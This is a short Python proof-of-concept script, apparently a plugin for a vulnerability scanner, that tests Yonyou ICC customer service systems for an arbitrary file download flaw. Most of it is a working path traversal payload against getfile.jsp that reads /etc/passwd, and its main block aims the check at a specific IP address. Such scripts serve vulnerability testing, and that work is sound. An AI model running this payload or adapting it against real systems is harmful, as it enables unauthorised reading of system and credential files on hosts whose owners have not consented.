#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  用友ICC客服系统 /web/common/getfile.jsp 任意文件下载漏洞 POC
References:  http://wooyun.org/bugs/wooyun-2015-090956
Author    :  foxhack
QQ        :  278563291
"""

import  re


def assign(service, arg):
    if service == "yongyou_icc":
        return True, arg

def audit(arg):
    url = arg
    payload=r'/web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\passwd'
    code, head, res, errcode, _ = curl.curl(url +payload )
    #print res
    if code == 200:
    	if "root:x:0:0:root:/root" in res:
            security_hole(u"存在漏洞：漏洞URL  "+url+payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_icc', 'http://111.75.198.122/')[1])